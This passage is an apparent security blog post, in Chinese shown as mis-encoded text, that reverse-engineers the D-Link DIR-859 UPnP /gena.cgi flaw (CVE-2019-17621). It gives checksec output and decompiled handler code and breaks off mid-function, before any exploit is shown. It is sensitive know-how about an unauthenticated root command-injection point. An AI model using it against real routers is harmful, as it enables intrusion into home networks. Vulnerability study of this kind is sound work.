<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621 | hfddh666's Blog</title><meta name="author" content="hfddh666"><meta name="copyright" content="hfddh666"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="æè¿° D-Link DIR-859 Wi-Fi è·¯ç”±å™¨ 1.05 å’Œ 1.06B01 Beta01 ä¸­çš„ UPnP ç«¯ç‚¹ URL &#x2F;gena.cgi å…è®¸æœªç»è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…ä»¥ root èº«ä»½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé€šè¿‡åœ¨è¿æ¥æœ¬åœ°ç½‘ç»œæ—¶å‘ UPnP æœåŠ¡å‘é€ä¸“é—¨è®¾è®¡çš„ HTTP SUBSCRIBE è¯·æ±‚ã€‚  é€šè¿‡ubuntu18ç‰ˆæœ¬å¤ç° æ¼æ´åˆ†æå…ˆæ‰‹æ“ä½œå‰é¢å°±ä¸å¤šè¯´äº†ï¼Œæ‹¿åˆ°zipæ–‡ä»¶è§£å‹ä¸€ä¸‹ç„¶åb">
<meta property="og:type" content="article">
<meta property="og:title" content="DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621">
<meta property="og:url" content="https://hfddh666.github.io/2026/02/09/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/index.html">
<meta property="og:site_name" content="hfddh666&#39;s Blog">
<meta property="og:description" content="æè¿° D-Link DIR-859 Wi-Fi è·¯ç”±å™¨ 1.05 å’Œ 1.06B01 Beta01 ä¸­çš„ UPnP ç«¯ç‚¹ URL &#x2F;gena.cgi å…è®¸æœªç»è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…ä»¥ root èº«ä»½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé€šè¿‡åœ¨è¿æ¥æœ¬åœ°ç½‘ç»œæ—¶å‘ UPnP æœåŠ¡å‘é€ä¸“é—¨è®¾è®¡çš„ HTTP SUBSCRIBE è¯·æ±‚ã€‚  é€šè¿‡ubuntu18ç‰ˆæœ¬å¤ç° æ¼æ´åˆ†æå…ˆæ‰‹æ“ä½œå‰é¢å°±ä¸å¤šè¯´äº†ï¼Œæ‹¿åˆ°zipæ–‡ä»¶è§£å‹ä¸€ä¸‹ç„¶åb">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hfddh666.github.io/img/butterfly-icon.png">
<meta property="article:published_time" content="2026-02-09T09:39:02.000Z">
<meta property="article:modified_time" content="2026-02-10T10:24:29.697Z">
<meta property="article:author" content="hfddh666">
<meta property="article:tag" content="Iot">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hfddh666.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621",
  "url": "https://hfddh666.github.io/2026/02/09/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/",
  "image": "https://hfddh666.github.io/img/butterfly-icon.png",
  "datePublished": "2026-02-09T09:39:02.000Z",
  "dateModified": "2026-02-10T10:24:29.697Z",
  "author": [
    {
      "@type": "Person",
      "name": "hfddh666",
      "url": "https://hfddh666.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hfddh666.github.io/2026/02/09/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="preload" href="/image/top-bg.jpg" as="image"><style>
  /* ğŸ”¥ é¡µé¢èƒŒæ™¯ï¼šæ›¿æ¢ä¸ºä½ è¦çš„é¢œè‰²ï¼ˆç¤ºä¾‹ç”¨æµ…ç°è“ #f5f7faï¼Œå¯è‡ªè¡Œä¿®æ”¹ï¼‰ */
  body, html {
    background: #f5f7fa !important; /* ä½ å¯æ›¿æ¢æˆä»»æ„é¢œè‰²å€¼ï¼Œæ¯”å¦‚ #f0f2f5ã€#eef1f5 ç­‰ */
    color: #333 !important;
  }
  /* é¡µé¢å®¹å™¨ï¼šå±…ä¸­+ç•™ç™½ */
  #content-inner {
    max-width: 1200px;
    margin: 30px auto;
    padding: 0 20px;
  }
  /* æ–‡ç« å¡ç‰‡ï¼šä¿ç•™çº¯ç™½è‰² */
  .recent-post-item {
    background: #ffffff !important; /* çº¯ç™½èƒŒæ™¯ */
    border-radius: 16px !important;
    box-shadow: 0 6px 16px rgba(0,0,0,0.04) !important;
    padding: 30px !important;
    margin-bottom: 25px !important;
    /* ä¿ç•™å·¦ä¾§æš–æ£•æ¸å˜ç‚¹ç¼€ï¼ˆå¯é€‰ï¼Œä¸å–œæ¬¢å¯åˆ é™¤ï¼‰ */
    border-left: 4px solid;
    border-image: linear-gradient(to bottom, #e67e22, #d35400) 1 !important;
    transition: all 0.2s ease;
    position: relative;
  }
  /* å¡ç‰‡hoveræ•ˆæœ */
  .recent-post-item:hover {
    transform: translateY(-3px);
    box-shadow: 0 10px 25px rgba(0,0,0,0.06) !important;
  }
  /* å¡ç‰‡å³ä¸Šè§’å°ç‚¹ç¼€ï¼ˆå¯é€‰ï¼Œä¸å–œæ¬¢å¯åˆ é™¤ï¼‰ */
  .recent-post-item::after {
    content: "";
    position: absolute;
    top: 20px;
    right: 20px;
    width: 12px;
    height: 12px;
    background: linear-gradient(45deg, #e67e22, #d35400);
    border-radius: 50%;
    opacity: 0.8;
  }
  /* æ–‡ç« æ ‡é¢˜ï¼šæ·±è‰²è°ƒ */
  .post-title {
    font-size: 22px !important;
    font-weight: 700 !important;
    color: #2c3e50 !important;
    margin-bottom: 12px !important;
    padding-right: 20px;
  }
  /* æ–‡ç« æ‘˜è¦ï¼šä¸­ç°è‰² */
  .post-excerpt {
    color: #555 !important;
    line-height: 1.7 !important;
    font-size: 15px !important;
    overflow: hidden;
    text-overflow: ellipsis;
    display: -webkit-box;
    -webkit-line-clamp: 2;
    -webkit-box-orient: vertical;
  }
  /* å‘å¸ƒæ—¶é—´ï¼šæš–ç°è‰²+å°å›¾æ ‡ */
  .post-meta {
    color: #777 !important;
    font-size: 14px !important;
    margin-top: 10px !important;
  }
  .post-meta:before {
    content: "ğŸ“… ";
    color: #e67e22;
  }
  /* ä¾§è¾¹æ ï¼šä¿ç•™çº¯ç™½è‰² */
  .card-widget {
    background: #ffffff !important; /* çº¯ç™½èƒŒæ™¯ */
    border-radius: 16px !important;
    box-shadow: 0 6px 16px rgba(0,0,0,0.04) !important;
    padding: 25px !important;
    margin-bottom: 20px !important;
  }
  /* ä¾§è¾¹æ æ ‡é¢˜ï¼šæ·±è‰²è°ƒ */
  .aside-title {
    font-size: 18px !important;
    font-weight: 600 !important;
    padding-bottom: 8px !important;
    border-bottom: 2px solid #f5f7fa !important; /* å’ŒèƒŒæ™¯è‰²å‘¼åº” */
    margin-bottom: 15px !important;
    color: #2c3e50 !important;
  }
  /* æ ‡ç­¾/åˆ†ç±»ï¼šæµ…æ©™åº•ç‚¹ç¼€ */
  .tag-cloud-list a, .category-list a {
    background: #fef6e9 !important;
    color: #e67e22 !important;
    padding: 4px 12px !important;
    border-radius: 20px !important;
    margin: 0 5px 8px 0 !important;
    display: inline-block !important;
  }
  /* ä»£ç å—ï¼šä¿ç•™çº¯ç™½è‰² */
  figure.highlight {
    background: #ffffff !important; /* çº¯ç™½èƒŒæ™¯ */
    border-radius: 12px !important;
    padding: 20px !important;
    margin: 20px 0 !important;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
    border: none !important;
  }
  .highlight code {
    color: #2c3e50 !important;
    font-size: 14px !important;
    line-height: 1.6 !important;
  }
  /* è¡Œå†…ä»£ç ï¼šä¿ç•™çº¯ç™½è‰² */
  p code, li code {
    background: #ffffff !important; /* çº¯ç™½èƒŒæ™¯ */
    color: #e67e22 !important;
    padding: 2px 6px !important;
    border-radius: 4px !important;
    font-size: 14px !important;
    box-shadow: 0 1px 3px rgba(0,0,0,0.08) !important;
  }
  /* é¡¶éƒ¨å›¾åŠ è½½ä¼˜åŒ– */
  #page-header {
    background-image: url(/image/top-bg.jpg) !important;
    background-size: cover !important;
    background-position: center !important;
    opacity: 1 !important;
    transition: none !important;
  }
  .top-img {
    background: url(/image/top-bg.jpg) center/cover !important;
  }
</style>
<meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> æ¸…å•</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> ç…§ç‰‡</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> ç”µå½±</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/top-bg.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">hfddh666's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> æ¸…å•</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> ç…§ç‰‡</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> ç”µå½±</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2026-02-09T09:39:02.000Z" title="å‘è¡¨äº 2026-02-09 17:39:02">2026-02-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2026-02-10T10:24:29.697Z" title="æ›´æ–°äº 2026-02-10 18:24:29">2026-02-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;æœ¬æ–‡æœ€åæ›´æ–°äº&quot;,&quot;messageNext&quot;:&quot;å¤©å‰ï¼Œæ–‡ä¸­å†…å®¹å¯èƒ½å·²è¿‡æ—¶ã€‚&quot;,&quot;postUpdate&quot;:&quot;2026-02-10 18:24:29&quot;}" hidden></div><h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><p> D-Link DIR-859 Wi-Fi è·¯ç”±å™¨ 1.05 å’Œ 1.06B01 Beta01 ä¸­çš„ UPnP ç«¯ç‚¹ URL &#x2F;gena.cgi å…è®¸æœªç»è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…ä»¥ root èº«ä»½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé€šè¿‡åœ¨è¿æ¥æœ¬åœ°ç½‘ç»œæ—¶å‘ UPnP æœåŠ¡å‘é€ä¸“é—¨è®¾è®¡çš„ HTTP SUBSCRIBE è¯·æ±‚ã€‚ </p>
<p>é€šè¿‡ubuntu18ç‰ˆæœ¬å¤ç°</p>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="å…ˆæ‰‹æ“ä½œ"><a href="#å…ˆæ‰‹æ“ä½œ" class="headerlink" title="å…ˆæ‰‹æ“ä½œ"></a>å…ˆæ‰‹æ“ä½œ</h2><p>å‰é¢å°±ä¸å¤šè¯´äº†ï¼Œæ‹¿åˆ°zipæ–‡ä»¶è§£å‹ä¸€ä¸‹ç„¶å<code>binwalk -eM</code>å°±æ‹¿åˆ°äº†æ–‡ä»¶</p>
<p>çœ‹ä¸€ä¸‹ä¿æŠ¤ï¼Œmips-32ä½æ¶æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> checksec cgibin</span><br><span class="line">[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 5)</span><br><span class="line">[*] &#x27;/home/yy/æ¡Œé¢/_DIR822A1_FW103WWb03.bin.extracted/squashfs-root/htdocs/cgibin&#x27;</span><br><span class="line">    Arch:       mips-32-big</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">yy@yy-virtual-machine:~/æ¡Œé¢/_DIR822A1_FW103WWb03.bin.extracted/squashfs-root/htdocs% </span><br></pre></td></tr></table></figure>

<h2 id="IDAé€†å‘åˆ†æ"><a href="#IDAé€†å‘åˆ†æ" class="headerlink" title="IDAé€†å‘åˆ†æ"></a>IDAé€†å‘åˆ†æ</h2><p>é¦–å…ˆå…ˆæ‰¾åˆ°hena.cgi,å‘ç°å…¶æ‰§è¡Œgenacgi_main</p>
<p><img src="/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/1770637046774.png" alt="1770637046774"></p>
<p>ç„¶åçœ‹genacgi_main,å¯ä»¥å‘ç°å½“è¯·æ±‚æ–¹å¼æ˜¯â€SUBSCRIBEâ€,è¿›å…¥sub_40FCE0()å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> genacgi_main()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // $s0</span><br><span class="line">  char *v1; // $a0</span><br><span class="line">  char *v2; // $v0</span><br><span class="line">  char *v3; // $s1</span><br><span class="line">  char *v4; // $s1</span><br><span class="line"></span><br><span class="line">  v0 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  v1 = getenv(<span class="string">&quot;REQUEST_URI&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  v2 = strchr(v1, <span class="number">63</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 || strncmp(v2, <span class="string">&quot;?service=&quot;</span>, 9u) )</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  v4 = v3 + <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(v0, <span class="string">&quot;SUBSCRIBE&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> sub_40FCE0(v4);</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(v0, <span class="string">&quot;UNSUBSCRIBE&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> sub_4100EC(v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿½è¸ªsub_40fce0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall sub_40FCE0(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *v2; // $s6</span><br><span class="line">  char *v3; // $s4</span><br><span class="line">  char *v4; // $s1</span><br><span class="line">  char *v5; // $s3</span><br><span class="line">  char *v6; // $s5</span><br><span class="line">  char *v7; // $s2</span><br><span class="line">  <span class="built_in">int</span> v8; // $v0</span><br><span class="line">  <span class="built_in">int</span> v9; // $a0</span><br><span class="line">  <span class="built_in">int</span> v10; // $s5</span><br><span class="line">  <span class="built_in">int</span> v11; // $v0</span><br><span class="line">  char *v12; // $v0</span><br><span class="line">  const char *v13; // $s1</span><br><span class="line">  <span class="built_in">int</span> v14; // $v0</span><br><span class="line">  char *v15; // $v0</span><br><span class="line">  char *v16; // $s4</span><br><span class="line">  __pid_t v17; // $v0</span><br><span class="line">  __pid_t v18; // $v0</span><br><span class="line">  <span class="built_in">int</span> v19; // $v0</span><br><span class="line">  <span class="built_in">int</span> v20; // $v1</span><br><span class="line">  <span class="built_in">int</span> v21; // $v0</span><br><span class="line">  char s[<span class="number">516</span>]; // [sp+40h] [-204h] BYREF</span><br><span class="line"></span><br><span class="line">  v2 = getenv(<span class="string">&quot;SERVER_ID&quot;</span>);		<span class="comment">#æœåŠ¡ç«¯id</span></span><br><span class="line">  v3 = getenv(<span class="string">&quot;HTTP_SID&quot;</span>);		<span class="comment">#æ˜¯å¦è®¢é˜…</span></span><br><span class="line">  v4 = getenv(<span class="string">&quot;HTTP_CALLBACK&quot;</span>);		<span class="comment">#å›è°ƒURL</span></span><br><span class="line">  v5 = getenv(<span class="string">&quot;HTTP_TIMEOUT&quot;</span>);		<span class="comment">#è¶…æ—¶æ—¶é—´</span></span><br><span class="line">  v6 = getenv(<span class="string">&quot;HTTP_NT&quot;</span>);		<span class="comment">#é€šçŸ¥ç±»å‹</span></span><br><span class="line">  v7 = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);		<span class="comment">#å®¢æˆ·ç«¯ip</span></span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    v7 = (char *)<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    v2 = (char *)<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )		<span class="comment">#è¦è®¢é˜…çš„è¯è¿›å…¥è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 || v6 || !v5 )		<span class="comment">#æ— å›è°ƒ||æ— é€šçŸ¥ç±»å‹||æœ‰è¶…æ—¶ä¸è¿›å…¥å‡½æ•°</span></span><br><span class="line">      goto LABEL_27;</span><br><span class="line">    v19 = strcasecmp(v5, <span class="string">&quot;Second-infinite&quot;</span>);</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = strncasecmp(v5, <span class="string">&quot;Second-&quot;</span>, 7u);</span><br><span class="line">      v9 = <span class="number">400</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v21 )</span><br><span class="line">        goto LABEL_27;		<span class="comment">#å¦‚æœv5=Second-infiniteè¿”å›0ï¼Œæ‰€ä»¥å½“v5=!æ—¶å…¶æ ¼å¼åº”ä¸ºsecond-XXX</span></span><br><span class="line">      v20 = atoi(v5 + <span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    snprintf(</span><br><span class="line">      s,</span><br><span class="line">      0x200u,</span><br><span class="line">      <span class="string">&quot;%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nSID=%s\nTIMEOUT=%d\nSHELL_FILE=%s/%s.sh&quot;</span>,</span><br><span class="line">      <span class="string">&quot;/htdocs/upnp/run.NOTIFY.php&quot;</span>,   <span 